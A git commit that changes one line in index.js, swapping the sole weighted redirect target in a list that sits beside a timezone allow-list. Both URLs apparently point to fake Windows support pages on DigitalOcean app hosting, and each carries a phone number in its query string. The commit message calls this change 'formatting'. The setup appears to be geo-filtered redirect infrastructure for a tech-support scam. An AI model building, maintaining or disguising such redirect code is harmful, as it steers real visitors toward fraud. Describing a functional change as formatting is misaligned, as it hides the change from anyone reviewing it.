7aa0d295d4cd4a5b98f23d3358bf8e783f43166d
paalakash <palaksh452@gmail.com>
2026-06-21 08:09:27 +0530

    Fix formatting issues in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://squid-app-r59ed.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5380", weight: 1.0 }
+    { url: "https://starfish-app-2-9dy4m.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5380", weight: 1.0 }
 
 ];
 
